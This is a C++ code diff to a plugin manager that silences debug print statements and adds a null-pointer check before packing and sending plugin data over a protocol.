@@ -140,9 +140,9 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
             //Buscamos las funciones exportadas
             getInterface = (pgetInterface)GPA_WRAPPER(newPlugin->Module.ModuleBase,"getInterface");
             if(getInterface && (newPlugin->plugInterface = getInterface())){
-                printf("getInterface\n");
+                //printf("getInterface\n");
                 newPlugin->ID = pluginModule->PluginID;
-                printf("pluginPrivate\n");
+                //printf("pluginPrivate\n");
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                 pluginList = pluginPrivate;
                 result = true;
@@ -189,11 +189,14 @@ plugin* PluginManagerInterfacePrivate::getPlugInformation(){
 }
 
 int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
-    DArray buff;
+    printf("[sendData] enviando datos 0x%p addr\n",data);
+    if(data){
+        DArray buff;
 
-    this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);
-    printf("[sendData] enviando datos\n");
-    return this->mgr->getProtocol()->send(buff.data,buff.size);
+        this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);
+        return this->mgr->getProtocol()->send(buff.data,buff.size);
+    }
+    return 0;
 }
 
 int PluginManagerInterfacePrivate::setErrorCode(uint code){
@@ -203,10 +206,10 @@ int PluginManagerInterfacePrivate::setErrorCode(uint code){
 bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
     plugin* currentPlugin;
     if((currentPlugin = getPluginById(pluginID))){
-         char buff[size+1];
+         /*char buff[size+1];
          ZeroMemory(buff,size+1);
          memcpy(buff,data,size);
-         printf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);
+         printf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);*/
 
          currentPlugin->plugInterface->onReciveData(data,size);
     }
